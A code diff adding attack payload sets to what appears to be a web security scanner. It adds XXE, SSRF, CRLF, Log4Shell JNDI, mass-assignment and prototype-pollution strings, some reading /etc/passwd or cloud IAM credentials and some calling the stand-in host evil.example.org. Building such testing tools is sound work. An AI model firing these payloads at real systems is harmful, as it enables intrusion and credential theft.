@@ -67,12 +67,55 @@ export const BUILTIN_PAYLOAD_SETS: readonly PayloadSet[] = [
     category: 'ssrf',
     payloads: [
       `http://169.254.169.254/latest/meta-data/`,
+      `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
       `http://127.0.0.1:80/`,
       `http://localhost/`,
       `http://[::1]/`,
       `http://169.254.169.254/`,
-      `http://metadata.google.internal/computeMetadata/v1/`,
+      `http://metadata.google.internal/computeMetadata/v1/`, // needs header Metadata-Flavor: Google
+      `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, // Azure IMDS — needs header Metadata: true
     ],
+  },
+  {
+    id: 'xxe',
+    name: 'XXE (XML external entity)',
+    category: 'xxe',
+    payloads: [
+      `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
+      `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>`,
+      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
+      `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example.org/x.dtd"> %p;]>`,
+    ],
+  },
+  {
+    id: 'crlf',
+    name: 'CRLF / header injection',
+    category: 'crlf',
+    payloads: [`%0d%0aSet-Cookie:crlf=1`, `%0d%0aX-Injected:crlf`, `%0aSet-Cookie:crlf=1`, `%E5%98%8A%E5%98%8DSet-Cookie:crlf=1`, `%23%0d%0aSet-Cookie:crlf=1`],
+  },
+  {
+    id: 'log4shell',
+    name: 'Log4Shell / JNDI',
+    category: 'jndi',
+    payloads: [
+      `\${jndi:ldap://evil.example.org/a}`,
+      `\${jndi:dns://evil.example.org/a}`,
+      `\${jndi:rmi://evil.example.org/a}`,
+      `\${\${lower:j}ndi:\${lower:l}dap://evil.example.org/a}`,
+      `\${jndi:ldap://127.0.0.1#evil.example.org/a}`,
+    ],
+  },
+  {
+    id: 'mass-assignment',
+    name: 'Mass-assignment fields',
+    category: 'mass-assignment',
+    payloads: [`is_admin`, `isAdmin`, `admin`, `role`, `roles`, `is_staff`, `is_superuser`, `verified`, `is_verified`, `active`, `enabled`, `approved`, `owner_id`, `account_id`, `permissions`, `balance`, `price`, `discount`],
+  },
+  {
+    id: 'prototype-pollution',
+    name: 'Prototype pollution',
+    category: 'proto',
+    payloads: [`__proto__[polluted]=1`, `__proto__.polluted=1`, `constructor[prototype][polluted]=1`, `constructor.prototype.polluted=1`, `{"__proto__":{"polluted":true}}`, `{"constructor":{"prototype":{"polluted":true}}}`],
   },
   {
     id: 'nosqli',
